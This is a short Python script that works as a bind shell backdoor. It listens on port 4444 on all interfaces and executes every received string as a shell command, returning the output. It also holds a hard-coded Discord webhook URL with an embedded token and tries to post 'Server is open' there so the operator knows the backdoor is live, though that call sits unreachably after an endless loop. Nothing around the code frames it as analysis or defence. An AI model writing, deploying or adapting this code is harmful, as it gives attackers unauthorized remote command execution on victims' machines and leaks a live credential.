import requests
import socket as s
import subprocess as sp

webhook_url = 'https://discord.com/api/webhooks/1209489160495304764/pSNsnAH07u8mAM3Ra9-oZTqhSZ5ysg_c5wLWAeepqdA-OPTEsxcQYH-Po1IIXHuiXQI2'  

def execute_and_notify():
    try:
        s1 = s.socket(s.AF_INET, s.SOCK_STREAM)
        s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
        s1.bind(("0.0.0.0", 4444))
        s1.listen(1)
        c, a = s1.accept()
        while True:
            d = c.recv(1024).decode()
            p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
            c.sendall(p.stdout.read() + p.stderr.read())

        data = {"content": "Server is open"}
        requests.post(webhook_url, json=data) 
        print('Message sent successfully.')

    except Exception as e:
        print('An error occurred:', e)

if __name__ == "__main__":
    execute_and_notify()
